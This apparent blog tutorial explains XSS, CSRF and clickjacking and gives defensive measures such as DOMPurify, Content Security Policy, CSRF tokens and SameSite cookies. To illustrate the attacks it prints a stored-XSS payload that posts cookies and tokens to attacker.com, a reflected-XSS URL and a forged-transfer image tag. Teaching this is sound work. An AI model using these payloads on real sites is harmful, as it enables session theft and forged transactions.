---
title: "Frontend Security: Complete XSS and CSRF Defense"
date: 2019-07-26 10:36:28
tags:
  - Security
readingTime: 2
description: "XSS and CSRF are the two most common frontend security vulnerabilities. This article covers both attack types with complete, practical defense strategies."
---

XSS and CSRF are the two most common frontend security vulnerabilities. This article covers both attack types with complete, practical defense strategies.

## XSS (Cross-Site Scripting)

XSS attacks inject malicious scripts into web pages viewed by other users. There are three types:

### 1. Stored XSS

Malicious script saved in the database, served to all users viewing the infected content:

```javascript
// Attacker submits this as a "comment":
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      token: localStorage.getItem('token')
    })
  })
</script>
```

### 2. Reflected XSS

Script injected via URL parameter, reflected in the response:

```
https://example.com/search?q=<script>alert(document.cookie)</script>
```

### 3. DOM-Based XSS

```javascript
// Vulnerable code
const userInput = location.hash.slice(1);
document.getElementById("output").innerHTML = userInput; // Dangerous!
```

## XSS Defense

### Use textContent Instead of innerHTML

```javascript
// DANGEROUS
element.innerHTML = userInput;

// SAFE
element.textContent = userInput;

// In React: JSX auto-escapes, so {userInput} is safe
// Only dangerouslySetInnerHTML is dangerous
```

### DOMPurify for HTML Content

When you must render HTML (e.g., rich text editor output):

```javascript
import DOMPurify from "dompurify";

// Clean the HTML before rendering
const clean = DOMPurify.sanitize(dirtyHTML, {
  ALLOWED_TAGS: ["p", "br", "strong", "em", "a", "ul", "ol", "li"],
  ALLOWED_ATTR: ["href", "target"],
});

element.innerHTML = clean;
```

### Content Security Policy (CSP)

CSP restricts what resources the page can load:

```html
<!-- Via meta tag -->
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'unsafe-inline'"
/>
```

Or via HTTP header (stronger, can't be bypassed):

```nginx
# nginx.conf
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' https://cdn.trusted.com;
  style-src 'self' https://fonts.googleapis.com;
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.myapp.com;
";
```

## CSRF (Cross-Site Request Forgery)

CSRF tricks authenticated users into submitting malicious requests:

```html
<!-- Attacker's page -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
<!-- The browser automatically sends the victim's cookies with this request -->
```

## CSRF Defense

### CSRF Token

```javascript
// Backend generates a unique token per session
// Frontend includes it in state-changing requests

// Axios global setup
axios.defaults.headers.common["X-CSRF-Token"] = document.querySelector(
  'meta[name="csrf-token"]',
)?.content;

// Or for fetch
async function securePost(url, data) {
  const csrfToken = getCsrfToken();
  return fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-CSRF-Token": csrfToken,
    },
    body: JSON.stringify(data),
  });
}
```

### SameSite Cookie

The most effective modern defense — tell the browser not to send cookies on cross-origin requests:

```http
Set-Cookie: sessionId=abc123; SameSite=Strict; HttpOnly; Secure
```

| Value    | Behavior                          |
| -------- | --------------------------------- |
| `Strict` | Never sent on cross-site requests |
| `Lax`    | Sent on top-level navigation only |
| `None`   | Always sent (requires Secure)     |

For most apps, `SameSite=Lax` (the browser default) is sufficient.

### Custom Request Headers

Browsers don't allow cross-origin requests with custom headers unless the server explicitly allows it (via CORS). So simply requiring a custom header like `X-Requested-With: XMLHttpRequest` blocks CSRF:

```javascript
// All AJAX requests include this header
axios.defaults.headers.common["X-Requested-With"] = "XMLHttpRequest";
```

## Clickjacking Defense

Prevent your site from being embedded in malicious iframes:

```nginx
# Prevent framing completely
add_header X-Frame-Options "DENY";

# Or allow only same origin
add_header X-Frame-Options "SAMEORIGIN";

# Modern CSP approach
add_header Content-Security-Policy "frame-ancestors 'self';";
```

## Security Checklist

- [ ] Never use `innerHTML` with user data — use `textContent` or DOMPurify
- [ ] Set `Content-Security-Policy` headers
- [ ] Set `HttpOnly` on session cookies (prevents JS access)
- [ ] Set `Secure` on cookies (HTTPS only)
- [ ] Set `SameSite=Lax` or `Strict` on cookies
- [ ] Implement CSRF tokens for state-changing API calls
- [ ] Add `X-Frame-Options` or `frame-ancestors` CSP
- [ ] Validate and sanitize all user inputs on the backend

## Summary

- XSS: always escape user data, use DOMPurify for HTML, set strict CSP
- CSRF: use SameSite cookies, CSRF tokens, or custom headers
- Clickjacking: use `X-Frame-Options` or `frame-ancestors` CSP
- Defense in depth — multiple layers are better than relying on a single mechanism
